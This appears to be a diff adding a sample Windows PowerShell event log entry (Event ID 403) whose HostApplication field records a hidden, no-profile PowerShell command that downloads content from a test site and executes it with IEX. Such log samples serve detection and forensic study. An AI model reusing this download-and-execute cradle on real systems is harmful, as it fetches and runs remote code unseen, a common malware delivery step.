@@ -1,0 +1,70 @@
+Log Name:      Windows PowerShell
+Source:        PowerShell
+Date:          21-05-2025 13:13:00
+Event ID:      403
+Task Category: Engine Lifecycle
+Level:         Information
+Keywords:      Classic
+User:          N/A
+Computer:      JEMINA-PC
+Description:
+Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=54
+
+	HostName=ConsoleHost
+	HostVersion=5.1.26100.4061
+	HostId=26cffee5-e7dd-4c1c-894f-d49bb3440a61
+	HostApplication=C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://testphp.vulnweb.com')
+	EngineVersion=5.1.26100.4061
+	RunspaceId=a2bf7c8b-11db-4851-bad8-faba9a941b05
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=
+Event Xml:
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="PowerShell" />
+    <EventID Qualifiers="0">403</EventID>
+    <Version>0</Version>
+    <Level>4</Level>
+    <Task>4</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x80000000000000</Keywords>
+    <TimeCreated SystemTime="2025-05-21T07:43:00.5240587Z" />
+    <EventRecordID>20836</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="15632" ThreadID="0" />
+    <Channel>Windows PowerShell</Channel>
+    <Computer>JEMINA-PC</Computer>
+    <Security />
+  </System>
+  <EventData>
+    <Data>Stopped</Data>
+    <Data>Available</Data>
+    <Data>	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=54
+
+	HostName=ConsoleHost
+	HostVersion=5.1.26100.4061
+	HostId=26cffee5-e7dd-4c1c-894f-d49bb3440a61
+	HostApplication=C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://testphp.vulnweb.com')
+	EngineVersion=5.1.26100.4061
+	RunspaceId=a2bf7c8b-11db-4851-bad8-faba9a941b05
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+  </EventData>
+</Event>
